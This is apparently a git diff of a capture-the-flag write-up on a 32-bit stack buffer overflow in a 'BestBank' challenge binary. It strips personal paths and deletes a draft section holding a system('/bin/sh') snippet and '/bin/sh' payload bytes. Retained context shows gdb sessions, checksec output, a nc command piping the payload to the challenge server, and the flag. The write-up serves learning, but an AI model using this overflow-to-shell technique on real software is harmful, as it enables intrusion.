@@ -276,7 +276,7 @@ Run the program with the payload. Continue until the captcha appears and the pro
 (gdb) run < payload
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank < payload
+Starting program: /lhc/Pwn/BestBank/bank < payload
 Welcome to the Best Bank!
 Current balance: $500
 
@@ -681,7 +681,7 @@ End with a line saying just "end".
 >x/1i $eip
 >end
 (gdb) run
-Starting program: /home/zionperez/Desktop/playgrounds/assembly/a2.out 
+Starting program: /assembly/a2.out 
 eax            0x0	0
 => 0x8048060 <_start>:	mov    al,0xff
 
@@ -823,7 +823,7 @@ To turn ASLR back off (default setting), use this:
 Before attempting to defeat ASLR, ensure to explore all other options. Check the program's security settings with `checksec`:
 ```
 $ checksec bank
-[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
+[*] '/lhc/Pwn/BestBank/bank'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -844,9 +844,9 @@ $ cat /proc/28447/maps
 The output looks similar to this. The column headers are added for convenience.
 ```
 Start    End Addr RWX? Offset                                            Location/Description
-08048000-0804b000 r-xp 00000000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
-0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
+08048000-0804b000 r-xp 00000000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
+0804b000-0804c000 r-xp 00002000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
+0804c000-0804d000 rwxp 00003000 fd:01 2441960                            /lhc/Pwn/BestBank/bank
 f7d93000-f7f68000 r-xp 00000000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
 f7f68000-f7f69000 ---p 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
 f7f69000-f7f6b000 r-xp 001d5000 fd:01 8130741                            /lib/i386-linux-gnu/libc-2.27.so
@@ -973,8 +973,7 @@ this is the return address after the scanf call completes
 0x804a0f7:	"%s"
 ```
 
-Check if %s is always at address: 0x804a0f7
-Yes it is.
+Check if %s is always at address: 0x804a0f7. Yes it is. According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
 
 `0xffffd974` is the location that scanf will write to. To confirm this, continue the program and check this memory location:
 ```
@@ -1023,65 +1022,6 @@ Now run it on the challenge server:
 $ (cat payload; cat) | nc challenges.laptophackingcoffee.org 2168
 ```
 
-# DRAFT SECTION:
-According to [Wikipedia][1]: uses of %s placeholders without length specifiers are inherently insecure and exploitable for buffer overflows. 
-
-Important breakpoints:
-```
->>> info breakpoints
-Num     Type           Disp Enb Address         What
-1       breakpoint     keep y   0x08049070      <__libc_start_main@plt>
-2       breakpoint     keep y   0x08049276      leave ; ret of captcha function 
-3       breakpoint     keep y   0x08049040      <printf@plt>
-5       breakpoint     keep y   0x08049080      <__isoc99_scanf@plt>
-8       breakpoint     keep y   0x08049208      captcha: instruction after printf
-```
-
-create the payload to inject a shell command
-```c
-// test2.c
-#include <stdlib.h>
-
-int main(int argc, char **argv)
-{
-    system("/bin/sh");
-}
-
-```
-found /bin/sh
-```
->>> x/s 0x5555555546f4
-0x5555555546f4:	"/bin/sh"
->>> x/8wx 0x5555555546f4
-0x5555555546f4:	0x6e69622f	0x0068732f	0x3b031b01	0x00000038
-                   n i b /       h s /
-                ^ add this to payload
-CyberChef:
- /  b  i  n  /  s  h
-2f 62 69 6e 2f 73 68
-```
-
-```
->>> info breakpoints
-Num     Type           Disp Enb Address    What
-1       breakpoint     keep y   0xf7e3bbb5 <__isoc99_scanf+5>       ; start of scanf
-2       breakpoint     keep y   0xf7e3bc6e <__isoc99_scanf+190>     ; ret of scanf
-5       breakpoint     keep y   0x08049208                          ; captcha: instruction after printf
-6       breakpoint     keep y   0x08049277                          ; ret of captcha function
-```
-
-
-```
-Stack
-+------------------+
-|   arguments      |
-+------------------+
-|   stack ptr      |
-+------------------+
-|   locals?        |
-+------------------+
-```
-
 Submit the flag:
 ```
 LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
@@ -1089,9 +1029,6 @@ LHC{b3st_b4nk_h4s_b33n_pwned-120927!!!}
 
 ## Notes to Self
 Started this challenge on 05 June 2020. Completed the challenge on 13 June 2020. It took nine (9) days of debugging, learning, and grinding to solve. This is my first buffer-overflow payload-to-shell exploit and I have learned a ton. This challenge involved an incredible amount of trial-and-error. However, the solution write-up skips *most* of these trials and instead focuses on the path to the goal. While the solution is important, it is the journey that makes it memorable and worthwhile. Happy hacking. 
-
-# TODO
-TODO: remove all /zionperez/ folder names
 
 ## Resources
 * [Wikipedia: scanf format string][1]
